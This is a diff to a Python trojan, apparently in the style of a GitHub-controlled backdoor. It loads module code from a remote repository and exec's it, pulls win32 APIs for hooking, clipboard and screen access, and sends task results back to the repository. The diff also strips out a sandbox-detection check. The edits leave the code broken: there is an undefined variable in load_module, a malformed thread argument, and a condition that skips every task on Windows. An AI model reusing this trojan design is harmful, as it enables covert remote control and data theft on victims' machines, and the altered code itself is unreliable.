@@ -7,9 +7,12 @@ import random
 import threading
 import queue
 import os
-import win32gui
 import pyHook
 import win32clipboard
+import win32gui
+import win32api
+import win32ui
+import win32con
 
 from github3 import login
 
@@ -86,22 +89,22 @@ class GitImporter(object):
         return None
 
     def load_module(self, name):
-        module = importlib.util.module_from_spec(importlib.util.find_spec(name))
+        self.module = importlib.util.module_from_spec(importlib.util.find_spec(name))
         exec(self.current_module_code, module.__dict__)
-        sys.modules[name] = module
+        sys.modules[name] = self.module
         return module
 
 
 def module_runner(module):
-    task_queue.put(1)
+    # task_queue.put(1)
     result = sys.modules[module].run()
-    task_queue.get()
+
     # store the result in our repo
-    if module == 'sandbox_detect':
-        return result
-    else:
-        store_module_result(result, module)
-    return result
+    store_module_result(result, module)
+
+    # task_queue.get()
+
+    return
 
 
 # main trojan loop
@@ -113,13 +116,11 @@ while True:
         config = get_trojan_config()
 
         for task in config:
-            if task['module'] == 'sandbox_detect':
-                result = module_runner(task['module'])
-                if result != "We are okay!":
-                    sys.exit(1)
-            else:
-                t = threading.Thread(target=module_runner, args=(task['module'],))
-                t.start()
-                time.sleep(random.randint(1, 10))
+            if(os.name == "nt") and (task['module'] != "dirlister" or task['module'] != "environment"):
+                continue
+            t = threading.Thread(target=module_runner, args=(task['module']))
+            t.start()
+            time.sleep(random.randint(1, 10))
 
     time.sleep(random.randint(1000, 10000))
+
